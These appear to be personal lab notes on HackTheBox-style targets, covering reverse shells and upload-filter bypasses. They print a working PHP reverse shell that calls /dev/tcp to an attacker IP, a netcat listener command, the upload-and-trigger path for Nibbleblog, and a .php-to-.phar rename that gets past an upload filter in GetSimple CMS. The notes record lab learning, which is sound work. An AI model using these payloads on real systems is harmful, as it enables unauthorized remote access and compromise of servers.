# Reverse Shells & File Upload Filter Bypasses

Real lab notes on catching interactive reverse shells and bypassing restricted file upload filters.

---

## 1. PHP One-Liner Reverse Shell Execution

### Target: Nibbleblog (HackTheBox)

1. Discovered an image upload feature within a vulnerable admin plugin.
2. Crafted a custom PHP reverse shell file (`shell.php`):

```php
<?php
exec("/bin/bash -c 'bash -i > /dev/tcp/10.10.15.122/9001 0>&1'");
?>
```

3. Started a Netcat listener on local Kali host:
```bash
sudo nc -lvnp 9001
```

4. Uploaded `shell.php` through the plugin image uploader.
5. Triggered execution by visiting the uploaded file location in the browser:
   `http://<TARGET_IP>/nibbleblog/content/private/plugins/my_image/image.php`

**Result**: Interactive shell received on Netcat listener.

---

## 2. Bypassing File Upload Extensions (`.php` -> `.phar`)

### Target: GetSimple CMS

1. Attempted to upload standard `.php` reverse shell, but the file uploader blocked `.php` extension uploads.
2. **Filter Bypass Technique**: Renamed the extension from `.php` to `.phar` (PHP Archive, which standard PHP interpreters still parse and execute as PHP code).
3. Uploaded `shell.phar` successfully, navigated to the upload directory, and caught the reverse shell on Kali listener.
